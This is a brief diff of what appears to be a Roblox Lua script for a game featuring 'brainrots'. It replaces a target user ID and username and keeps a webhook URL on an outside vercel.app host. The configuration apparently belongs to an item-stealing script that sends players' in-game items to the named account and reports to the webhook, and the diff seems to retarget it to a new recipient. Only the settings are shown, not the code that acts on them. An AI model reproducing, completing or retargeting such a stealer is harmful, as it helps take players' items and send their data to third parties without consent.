@@ -1,5 +1,5 @@
-local TARGET_ID = 7025348796
-local TARGET_USER = "yytrywer761473"
+local TARGET_ID = 9015394340
+local TARGET_USER = "evadezada"
 local WEBHOOK_URL = "https://chocola-moreira1.vercel.app/"
 
 local TargetBrainrots = {
